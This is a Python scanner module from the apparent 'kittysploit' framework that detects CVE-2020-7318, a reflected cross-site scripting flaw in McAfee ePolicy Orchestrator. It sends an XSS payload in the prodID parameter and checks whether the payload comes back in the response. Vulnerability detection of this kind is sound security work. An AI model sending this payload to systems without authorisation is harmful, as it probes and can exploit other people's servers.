#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""McAfee ePolicy Orchestrator before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'McAfee ePolicy Orchestrator <5.10.9 Update 9 - Cross-Site Scripting Detection',
        'description': "McAfee ePolicy Orchestrator before 5.10.9 Update 9 is vulnerable to a cross-site scripting vulnerability that allows administrators to inject arbitrary web script or HTML via multiple parameters where the administrator's entries were not correctly sanitized. reference: - https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/ - https://kc.mcafee.com/corporate/index?page=content&id=SB10332 - https://nvd.nist.gov/vuln/detail/CVE-2020-7318",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'mcafee', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://kc.mcafee.com/corporate/index?page=content&id=SB10332',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-7318',
    }

    def run(self):
        path = '/PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Connection': 'close'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Policy Name', '\'"><svg/onload=alert(document.domain)>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='McAfee ePolicy Orchestrator <5.10.9 Update 9 - Cross-Site Scripting detected', path=path)
            return True
        return False

